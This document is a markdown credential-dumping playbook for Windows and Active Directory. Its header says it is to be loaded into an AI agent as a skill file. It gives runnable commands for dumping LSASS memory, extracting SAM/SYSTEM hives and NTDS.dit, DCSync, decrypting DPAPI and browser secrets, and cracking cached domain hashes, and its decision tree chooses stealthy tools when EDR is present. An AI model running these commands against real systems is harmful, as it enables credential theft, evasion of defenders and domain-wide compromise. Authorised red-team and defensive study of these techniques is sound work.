# Credential Dumping Techniques

> **AI LOAD INSTRUCTION**: Load this for LSASS dump methods, SAM/SYSTEM extraction, DPAPI secrets, cached domain credentials, and NTDS.dit extraction. Assumes the main [SKILL.md](./SKILL.md) is already loaded for lateral movement techniques.

---

## 1. LSASS MEMORY DUMP TECHNIQUES

### Method Comparison

| Method | Tool | AV Detection Risk | Requires | Notes |
|---|---|---|---|---|
| MiniDump (comsvcs.dll) | Built-in Windows DLL | Medium | Admin + SeDebugPrivilege | Commonly monitored |
| ProcDump | Sysinternals (signed) | Medium-High | Admin | Microsoft-signed, but well-known |
| Mimikatz | Custom | High | Admin + SeDebugPrivilege | Most capable, most detected |
| nanodump | Custom | Low | Admin + SeDebugPrivilege | Uses MiniDumpWriteDump variants |
| handlekatz | Custom | Low | Admin | Clone LSASS handle, then dump |
| PPLdump | Custom | Low | Admin | Bypass PPL (Protected Process Light) |
| lsassy | Remote (Impacket) | Medium | Admin SMB access | Remote dump + parse, no disk touch |

### comsvcs.dll MiniDump

```cmd
# Find LSASS PID
tasklist /fi "imagename eq lsass.exe"

# Dump using comsvcs.dll (built-in Windows DLL)
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump PID C:\temp\lsass.dmp full
```

```powershell
# PowerShell variant
$lsass = Get-Process lsass
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $lsass.Id C:\temp\lsass.dmp full
```

### ProcDump (Sysinternals)

```cmd
procdump -ma lsass.exe lsass.dmp -accepteula
```

### Mimikatz (Direct Memory Read)

```cmd
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
mimikatz # sekurlsa::wdigest           & REM WDigest plaintext (if enabled)
mimikatz # sekurlsa::kerberos          & REM Kerberos tickets
mimikatz # sekurlsa::msv               & REM NTLM hashes
```

### nanodump (EDR Evasion)

```cmd
# Direct syscalls, unhooks NTDLL, avoids API hooks
nanodump.exe --write C:\temp\lsass.dmp
nanodump.exe --fork --write C:\temp\lsass.dmp   & REM Fork process first (stealthier)
```

### handlekatz

```cmd
# Clone LSASS handle from another process (avoids direct LSASS open)
handlekatz.exe --pid LSASS_PID --outfile C:\temp\lsass.dmp
```

### Remote Dump with lsassy

```bash
# From Linux — dump and parse remotely
lsassy -u administrator -p password TARGET_IP
lsassy -u administrator -H NTLM_HASH TARGET_IP

# Specific dump method
lsassy -u administrator -p password TARGET_IP -m comsvcs
lsassy -u administrator -p password TARGET_IP -m nanodump
```

### Parse Dump Offline

```bash
# Mimikatz offline parsing
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords

# pypykatz (Python, cross-platform)
pypykatz lsa minidump lsass.dmp
```

---

## 2. SAM / SYSTEM / SECURITY HIVE EXTRACTION

### Local Extraction

```cmd
# reg save (requires admin)
reg save HKLM\SAM C:\temp\SAM
reg save HKLM\SYSTEM C:\temp\SYSTEM
reg save HKLM\SECURITY C:\temp\SECURITY

# Volume Shadow Copy
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\temp\SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\SYSTEM
```

### Remote Extraction

```bash
# Impacket secretsdump (remote, in-memory)
secretsdump.py DOMAIN/administrator:password@TARGET_IP

# With hash
secretsdump.py -hashes :NTLM_HASH DOMAIN/administrator@TARGET_IP

# CrackMapExec
crackmapexec smb TARGET_IP -u administrator -p password --sam
crackmapexec smb TARGET_IP -u administrator -p password --lsa
```

### Offline Parsing

```bash
# Impacket secretsdump offline
secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL

# Extract local account hashes + cached domain creds + LSA secrets
```

---

## 3. DPAPI SECRETS

DPAPI protects browser passwords, Wi-Fi keys, credential manager entries, and more.

### Credential Manager

```cmd
# List stored credentials
cmdkey /list

# Mimikatz — dump DPAPI credentials
mimikatz # vault::cred
mimikatz # vault::list

# Decrypt DPAPI blobs
mimikatz # dpapi::cred /in:C:\Users\user\AppData\Local\Microsoft\Credentials\{GUID}
```

### Master Key Extraction

```cmd
# Get user's DPAPI master keys
mimikatz # sekurlsa::dpapi

# Decrypt master key with domain backup key (requires DA)
mimikatz # lsadump::backupkeys /system:DC01.domain.com /export
mimikatz # dpapi::masterkey /in:masterkey_file /pvk:backup_key.pvk
```

### Browser Credentials

```bash
# SharpChromium (Chrome/Edge passwords)
SharpChromium.exe logins

# SharpDPAPI (comprehensive DPAPI extraction)
SharpDPAPI.exe triage
SharpDPAPI.exe credentials /server:DC01.domain.com   & REM Using domain backup key

# From Linux with Impacket
dpapi.py backupkeys -t DOMAIN/administrator:password@DC01
```

---

## 4. CACHED DOMAIN CREDENTIALS

Windows caches the last N domain logon credentials (default: 10).

```bash
# Impacket secretsdump extracts these automatically
secretsdump.py DOMAIN/admin:pass@TARGET -just-dc-user cachedcreds

# Format: $DCC2$10240#username#hash
# Crack with hashcat mode 2100
hashcat -m 2100 cached.txt wordlist.txt
```

```cmd
# Mimikatz
mimikatz # lsadump::cache

# Registry location
# HKLM\SECURITY\Cache
```

**Note**: DCC2 hashes are slow to crack (~50k/s on GPU vs millions for NTLM).

---

## 5. NTDS.DIT EXTRACTION (DOMAIN CONTROLLER)

### Method 1: ntdsutil (Built-in)

```cmd
# Create IFM (Install From Media) — includes NTDS.dit + SYSTEM
ntdsutil "ac i ntds" "ifm" "create full C:\temp\ifm" quit quit

# Extract from IFM
secretsdump.py -ntds C:\temp\ifm\Active\ Directory\ntds.dit \
  -system C:\temp\ifm\registry\SYSTEM LOCAL
```

### Method 2: Volume Shadow Copy

```cmd
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\temp\ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\SYSTEM
```

### Method 3: DCSync (No File Access Needed)

```bash
# Full dump
secretsdump.py DOMAIN/admin:pass@DC01 -just-dc

# Specific user
secretsdump.py DOMAIN/admin:pass@DC01 -just-dc-user krbtgt

# With Kerberos auth
export KRB5CCNAME=admin.ccache
secretsdump.py -k -no-pass DC01.domain.com -just-dc
```

### Method 4: esentutl (Copy While in Use)

```cmd
esentutl.exe /y /vss C:\Windows\NTDS\ntds.dit /d C:\temp\ntds.dit
```

### Offline Parsing

```bash
# Full extraction
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL

# With history (previous passwords)
secretsdump.py -ntds ntds.dit -system SYSTEM -history LOCAL

# Just NTLM hashes (for cracking)
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL -outputfile domain_hashes
```

---

## 6. WINDOWS CREDENTIAL LOCATIONS SUMMARY

| Location | Contents | Extraction Tool |
|---|---|---|
| LSASS memory | NTLM hashes, Kerberos tickets, plaintext (WDigest) | Mimikatz, nanodump, lsassy |
| SAM hive | Local account NTLM hashes | reg save + secretsdump |
| SECURITY hive | LSA secrets, cached domain creds | reg save + secretsdump |
| SYSTEM hive | Boot key (needed to decrypt SAM) | reg save |
| NTDS.dit | All domain account hashes | ntdsutil, VSS, DCSync |
| DPAPI blobs | Browser passwords, Wi-Fi keys, cred manager | SharpDPAPI, Mimikatz |
| Credential Manager | Saved Windows credentials | cmdkey, Mimikatz |
| Group Policy Preferences | Legacy encrypted passwords (cpassword) | gpp-decrypt |
| Unattend.xml / sysprep | Setup passwords (base64) | Manual extraction |
| web.config / .config | Connection strings, API keys | Manual search |
| Registry autoruns | Service account passwords | reg query |

---

## 7. CREDENTIAL DUMP DECISION TREE

```
Need to extract credentials
│
├── Have local admin on target?
│   ├── LSASS dump (§1)
│   │   ├── EDR present? → nanodump or handlekatz (stealthy)
│   │   ├── No EDR → Mimikatz or comsvcs.dll (fastest)
│   │   └── Remote only → lsassy from Linux
│   │
│   ├── Local hashes → SAM/SYSTEM extraction (§2)
│   │   ├── Local → reg save
│   │   └── Remote → secretsdump.py or CrackMapExec --sam
│   │
│   └── DPAPI secrets → SharpDPAPI or Mimikatz (§3)
│
├── Have domain admin?
│   ├── DCSync → secretsdump.py (§5, easiest, no file access needed)
│   ├── NTDS.dit extraction → ntdsutil / VSS (§5)
│   └── Domain DPAPI backup key → decrypt all user DPAPI (§3)
│
├── Only have SMB file access (no admin)?
│   ├── Check for GPP passwords (cpassword in SYSVOL)
│   ├── Check for scripts with hardcoded creds
│   └── Check for unattend.xml / web.config files
│
└── Offline dump file (.dmp)?
    ├── LSASS dump → pypykatz / Mimikatz offline (§1)
    └── SAM+SYSTEM → secretsdump.py LOCAL (§2)
```
